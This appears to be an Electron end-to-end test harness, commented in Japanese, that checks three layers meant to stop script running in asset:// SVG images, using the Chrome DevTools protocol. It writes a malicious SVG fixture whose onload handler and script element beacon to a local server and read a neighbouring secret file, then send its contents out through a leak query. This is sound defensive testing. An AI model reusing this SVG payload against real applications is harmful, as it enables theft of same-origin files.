'use strict';

// asset:// のスクリプト封じ込め（#215）を、実際の Electron に対して検証する
// ハーネス。
//
//   node e2e/harness/cases/test-app-asset-csp.cts
//
// 何が懸かっているか: asset://img/* はライブラリ全体で単一のオリジンなので、
// もしそこに「文書」が立ち上がってしまうと、その中のスクリプトは同一
// オリジンの fetch 経由で他のファイルを読み、外へ送信できてしまう。ウィンドウ
// の sandbox:true が落とすのは Node/IPC だけで、ページ内部の JS は止めない。
// 封じ込めは3層あり、このハーネスはそれぞれを別々に計測する。
//
//   層1 入口（open-image-window）: SVG を渡すとウィンドウを作らずに false を返す
//   層2 入口（will-navigate）    : asset:// 上の SVG へのトップレベル遷移を拒む
//   層3 応答（CSP ヘッダー）      : それでも文書が作られてしまった場合にスクリプトを殺す
//
// 層3の計測方法＝CDP。層1と層2が塞がれると、アプリの内部のどの経路も SVG
// 文書へ届かなくなる＝「届かない、だから安全」で止めてしまうと、新しい入口が
// 現れた瞬間、実は何も守っていなかったと気付くことになる。そこでデバッガを
// 使いビューアウィンドウを SVG へ直接送り込み、CSP だけが残った状態を作って
// それを計測する。
//
// 効いたことの証拠は「ビーコンが1本も届かない」ことで取る。SVG 内のスクリプト
// は、自前のローカル HTTP サーバへ向けて①そもそも実行されたこと、②ライブラリ
// 内の別のファイルを読めたこと、の2つを発火するよう書いてある＝ビーコンが
// 1本でも届けばスクリプトは実行された。逆に言えば、このハーネスは「何も
// 起きないこと」を見張るように作られているので、開発中に CSP を外すと実際に
// ビーコンが飛ぶことを確認した（つまりこれは偽陰性ではない）。
//
// 画面を占有しない: HOLOGRAM_SMOKE=1 の下ではビューアウィンドウも隠して
// 作られる。

const { spawn } = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const net = require('node:net');
const os = require('node:os');
const path = require('node:path');
const WebSocket = require('ws');

const appDir = path.join(__dirname, '../../../app');
const { electronPath: resolveElectron } = require('../../../scripts/lib-electron-path.cts');

const PNG = 'dummy-csp-0001.png';
const SVG = 'dummy-csp-0002.svg';
const SECRET = 'dummy-csp-secret.txt';
const SECRET_TEXT = 'library-private-9e3f';
// この幅の要求は CSS background だけが行い、CDP で完了まで確認する。
const BG_W = 200;

// base64 でインラインにするのではなく生成した、本物のべた塗り色 PNG:
// サムネイル経路は渡されたものを実際にデコードするので、1x1 のプレース
// ホルダーではそれを生き延びられない（このハーネスは、生成されたサムネイル
// を CSS の background が実際にハンドラへ届いた証拠として読む）。
function solidPng(size: number, rgb: [number, number, number]): Buffer {
  const zlib = require('node:zlib');
  const raw = Buffer.alloc(size * (size * 3 + 1));
  for (let y = 0; y < size; y++) {
    const row = y * (size * 3 + 1);
    raw[row] = 0; // filter: none
    for (let x = 0; x < size; x++) {
      raw[row + 1 + x * 3] = rgb[0];
      raw[row + 2 + x * 3] = rgb[1];
      raw[row + 3 + x * 3] = rgb[2];
    }
  }
  const crcTable: number[] = [];
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    crcTable[n] = c >>> 0;
  }
  const crc = (b: Buffer) => {
    let c = 0xffffffff;
    for (const byte of b) c = crcTable[(c ^ byte) & 0xff] ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  };
  const chunk = (type: string, data: Buffer) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const sum = Buffer.alloc(4);
    sum.writeUInt32BE(crc(body));
    return Buffer.concat([len, body, sum]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(size, 0);
  ihdr.writeUInt32BE(size, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}

const freePort = (): Promise<number> =>
  new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.once('error', reject);
    srv.listen(0, '127.0.0.1', () => {
      const p = srv.address().port;
      srv.close(() => resolve(p));
    });
  });

const { sleep, waitFor, evalSource } = require('../../../scripts/lib-wait.cts');

// --- CDP（scripts/cdp-verify.cts と同じ形。必要な分だけに削ってある） ---
function cdpList(port: number): Promise<any[]> {
  return new Promise((resolve, reject) => {
    http
      .get(`http://127.0.0.1:${port}/json/list`, (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => {
          try {
            resolve(JSON.parse(body));
          } catch (e) {
            reject(e);
          }
        });
      })
      .on('error', reject);
  });
}

async function cdpConnect(wsUrl: string) {
  const ws = new WebSocket(wsUrl);
  let id = 0;
  const pending = new Map();
  ws.on('message', (d) => {
    const m = JSON.parse(d);
    if (m.id && pending.has(m.id)) {
      const { res, rej } = pending.get(m.id);
      pending.delete(m.id);
      m.error ? rej(new Error(JSON.stringify(m.error))) : res(m.result);
    }
  });
  await new Promise((r) => ws.on('open', r));
  const send = (method: string, params?: any) =>
    new Promise<any>((res, rej) => {
      const mid = ++id;
      pending.set(mid, { res, rej });
      ws.send(JSON.stringify({ id: mid, method, params }));
    });
  return { ws, send };
}

async function main() {
  const beaconPort = await freePort();
  const cdpPort = await freePort();

  // このサーバが受け取るリクエストはどれも、asset:// の文書の中でスクリプトが
  // 実行されたことを意味する。
  const beacons: string[] = [];
  const beaconSrv = http.createServer((req, res) => {
    beacons.push(req.url);
    res.writeHead(204).end();
  });
  await new Promise((r) => beaconSrv.listen(beaconPort, '127.0.0.1', r as any));

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hologram-assetcsp-'));
  const configDir = path.join(tmp, 'Hologram');
  const saveFolder = path.join(tmp, 'saves');
  fs.mkdirSync(configDir, { recursive: true });
  fs.mkdirSync(saveFolder, { recursive: true });
  fs.writeFileSync(path.join(configDir, 'config.json'), JSON.stringify({ saveFolder, extensionId: 'x' }));

  // ラスタ画像のケース。これは動き続けなければならない — 原寸・サムネイル・
  // CSS の background。
  fs.writeFileSync(path.join(saveFolder, PNG), solidPng(256, [0x3a, 0xa0, 0xdd]));
  // スクリプト化された SVG が狙うであろう、隣にあるライブラリのファイル。
  fs.writeFileSync(path.join(saveFolder, SECRET), SECRET_TEXT);

  // 悪意ある画像。独立した2つのスクリプト経路（インラインハンドラと
  // <script> 要素）を使う。CSP はその両方を殺さなければならないため。さらに
  // 経路ごとに独立した2本のビーコン: 「そもそも実行された」と「隣のファイルを
  // 読めた」。
  const B = `http://127.0.0.1:${beaconPort}`;
  fs.writeFileSync(
    path.join(saveFolder, SVG),
    `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" onload="new Image().src='${B}/ran-onload'">
  <rect width="64" height="64" fill="#3ad"/>
  <script type="application/ecmascript"><![CDATA[
    function beacon(p) {
      try { new Image().src = '${B}' + p; } catch (e) {}
      try { fetch('${B}' + p, { mode: 'no-cors' }); } catch (e) {}
    }
    beacon('/ran-script');
    try {
      fetch('asset://img/${SECRET}')
        .then(function (r) { return r.text(); })
        .then(function (t) { beacon('/leak?d=' + encodeURIComponent(t)); });
    } catch (e) {}
  ]]></script>
</svg>
`,
  );

  // メインレンダラーで実行される。主張の後のすべては保持: ハーネスは
  // ビューアウィンドウに対して CDP を駆動している間、アプリを生かしておく
  // 必要がある。
  const evalJs = evalSource(
    async ({ sleep, neverHappens }, args) => {
      const h = (window as any).hologram;
      // 層1: SVG はきっぱり拒まれる。ラスタは今まで通り開く（SMOKE 下では隠れる）。
      const svgRefused = (await h.openImageWindow(args.svg)) === false;
      const rasterAccepted = (await h.openImageWindow(args.png)) === true;

      // 層2: SVG へのトップレベル遷移はナビゲーションの番人に拒まれる。
      const before = location.href;
      try {
        location.href = `asset://img/${args.svg}`;
      } catch {}
      // 主張は、この遷移が「決してコミットしない」こと。だからこの観測窓
      // 自体が検証であり、neverHappens はあえてそれを全部使い切り、もし
      // コミットしたらそのケースを名指しする（コミットしてしまうと main 側の
      // eval も拒否されるはず — #917 を参照）。
      const navBlocked = await neverHappens('asset の SVG へのトップレベル遷移', () => location.href !== before, 800);

      // 退行チェック: 応答の CSP は「その応答から作られた文書」に効くので、
      // これらには触れてはならない — 画像を埋め込んでいるレンダラーは別の
      // 文書で、自身のポリシーを持つ。
      const load = (src: string) =>
        new Promise<boolean>((r) => {
          const i = new Image();
          i.onload = () => r(i.naturalWidth > 0);
          i.onerror = () => r(false);
          i.src = src;
        });
      const imgPng = await load(`asset://img/${args.png}`);
      const imgThumb = await load(`asset://img/${args.png}?w=180`);
      const imgSvg = await load(`asset://img/${args.svg}`);

      // 固定時間で、background に必要な待ちはこれだけ: 下の保持がすでに、
      // main がそのサムネイルを書くのにかかるどんな時間よりも長い（かつて
      // ここに別立てであった1500msの落ち着きは、この中に収まっていた）。
      // この保持自体は意図的なもの — ハーネスがビューアウィンドウに対して
      // CDP を駆動している間、アプリは生きていなければならず、この eval で
      // はなくハーネスの方が実行を終わらせる。
      // biome-ignore lint/plugin: a hold, sized to outlast the harness's CDP pass
      await sleep(12000);
      return { svgRefused, rasterAccepted, navBlocked, imgPng, imgThumb, imgSvg };
    },
    { svg: SVG, png: PNG, bgW: BG_W },
  );

  const env = Object.assign({}, process.env, {
    APPDATA: tmp,
    HOLOGRAM_CONFIG_DIR: configDir,
    HOLOGRAM_SMOKE: '1',
    HOLOGRAM_SMOKE_EVAL: evalJs,
  });

  const child = spawn(resolveElectron(), ['.', `--remote-debugging-port=${cdpPort}`], { cwd: appDir, env, stdio: ['inherit', 'pipe', 'inherit'] });
  let out = '';
  child.stdout.on('data', (d) => {
    out += d.toString();
    process.stdout.write(d);
  });
  const exited = new Promise<void>((r) => child.on('close', () => r()));

  // --- 層3: デバッガで両方の入口ゲートを飛び越え、asset:// 上に本物の SVG
  // 文書を着地させる。これで CSP だけが残った状態になる。
  let cdpReachedSvg = false;
  let cdpDocType = '';
  let cdpNote = '';
  let rasterRendered = false;
  let cssBg = false;
  try {
    let viewer: any = null;
    await waitFor(
      'ビューアウィンドウがデバッグポート上に asset:// の対象として現れること',
      async () => {
        try {
          viewer = (await cdpList(cdpPort)).find((t) => t.type === 'page' && String(t.url).startsWith('asset://'));
        } catch {
          /* devtools のエンドポイントがまだ上がっていない */
        }
        return !!viewer;
      },
      { timeoutMs: 30_000, pollMs: 500 },
    );
    const { ws, send } = await cdpConnect(viewer.webSocketDebuggerUrl);
    // キャッシュ形式や終了時の削除に依存せず、CSS が要求した画像の実応答を確認する。
    const mainTarget = (await cdpList(cdpPort)).find((t) => t.type === 'page' && !String(t.url).startsWith('asset://'));
    const mainCdp = await cdpConnect(mainTarget.webSocketDebuggerUrl);
    try {
      const backgroundUrl = `asset://img/${PNG}?w=${BG_W}`;
      let requestId = '';
      let finished = false;
      mainCdp.ws.on('message', (data) => {
        const message = JSON.parse(data.toString());
        if (message.method === 'Network.responseReceived' && message.params.response.url === backgroundUrl && message.params.response.status === 200 && message.params.response.mimeType.startsWith('image/')) requestId = message.params.requestId;
        if (message.method === 'Network.loadingFinished' && message.params.requestId === requestId) finished = true;
      });
      await mainCdp.send('Network.enable');
      await mainCdp.send('Runtime.evaluate', {
        expression: `(() => { const d = document.createElement('div'); d.style.cssText = 'position:fixed;left:0;top:0;z-index:-1;opacity:0;width:10px;height:10px;background-image:url("${backgroundUrl}")'; document.body.appendChild(d); d.getBoundingClientRect(); })()`,
      });
      await waitFor('CSS background の画像応答が完了すること', () => finished, { timeoutMs: 5_000, pollMs: 50 });
      const body = await mainCdp.send('Network.getResponseBody', { requestId });
      const bytes = Buffer.from(body.body, body.base64Encoded ? 'base64' : 'utf8');
      const metadata = await require('sharp')(bytes).metadata();
      cssBg = !!metadata.width && !!metadata.height;
    } finally {
      mainCdp.ws.close();
    }
    await send('Page.enable');
    await send('Runtime.enable');
    // 乗っ取る前に: ラスタのウィンドウは、実際に出荷する文書に応答の CSP が
    // 効く唯一の場所なので、Chromium 組み込みの画像ビューがその下で今も
    // 画像をデコードできているか（img-src 'self'）を確認しておく。
    const shown = await send('Runtime.evaluate', { expression: 'document.images.length === 1 && document.images[0].naturalWidth', returnByValue: true });
    rasterRendered = Number(shown?.result?.value) > 0;
    await send('Page.navigate', { url: `asset://img/${SVG}` });
    // 固定時間: この遷移がそもそもコミットするかどうか自体を、次の行が
    // 「計測」する（層3は「SVG 文書へ到達した」か「手前で止まった」かを
    // 報告する）ので、必ず来ると保証された事後条件が存在しない — 何かを
    // 待ってしまうと、正当な結果をタイムアウトに変えてしまう。
    // biome-ignore lint/plugin: whether this navigation commits is what is measured
    await sleep(2500);
    const r = await send('Runtime.evaluate', { expression: '[document.contentType, location.href].join(" ")', returnByValue: true });
    cdpDocType = String(r?.result?.value || '');
    cdpReachedSvg = cdpDocType.startsWith('image/svg+xml ') && cdpDocType.includes(SVG);
    // 固定時間: 主張は「ビーコンが一度も届かない」ことなので、この観測窓
    // 自体が検証そのもの — 生き残ったスクリプトにビーコンを送る時間を
    // 与えなければならない。
    // biome-ignore lint/plugin: window in which a surviving script would beacon
    await sleep(1500);
    ws.close();
  } catch (e) {
    cdpNote = (e as Error).message;
  }

  await exited;

  const m = out.match(/EVAL_RESULT (\{.*\})/);
  let r: Record<string, any> = {};
  try {
    r = JSON.parse((m && m[1]) as string);
  } catch {
    /* 空のまま残す — 下の主張がすべて失敗する。これが正しい答え */
  }

  fs.rmSync(tmp, { recursive: true, force: true });
  beaconSrv.close();

  let ok = true;
  const check = (label, cond) => {
    console.log((cond ? 'PASS' : 'FAIL') + '  ' + label);
    if (!cond) ok = false;
  };

  console.log('\n--- asset:// のスクリプト封じ (#215) ---\n');
  check('層1 SVG は open-image-window に拒まれる（窓を作らない）', r.svgRefused === true);
  check('層1 ラスタ画像の窓は今までどおり開く', r.rasterAccepted === true);
  check('層2 asset:// の SVG へのトップレベル遷移が拒まれる', r.navBlocked === true);
  console.log(`     （層3 の到達状況: ${cdpReachedSvg ? `SVG 文書まで到達＝CSP だけで止めた [${cdpDocType}]` : `SVG 文書へ到達せず＝手前で止まった [${cdpDocType || cdpNote}]`}）`);
  check('層3 SVG 内スクリプトが1本もビーコンを出していない', beacons.length === 0);
  if (beacons.length) console.log('     受信したビーコン: ' + beacons.join(', '));
  check('退行なし 単独ウィンドウがラスタ画像を描画する（CSP 下でも Chromium の画像ビューが成立）', rasterRendered === true);
  check('退行なし <img> でラスタ原寸が表示できる', r.imgPng === true);
  check('退行なし <img> でサムネイル（?w=）が表示できる', r.imgThumb === true);
  check('退行なし <img> で SVG が絵として表示できる（文書化しないので安全）', r.imgSvg === true);
  check('退行なし CSS background-image の画像応答が完了して復号できる', cssBg === true);

  console.log('\n' + (ok ? 'ASSET_CSP_TEST_PASS' : 'ASSET_CSP_TEST_FAIL'));
  process.exit(ok ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
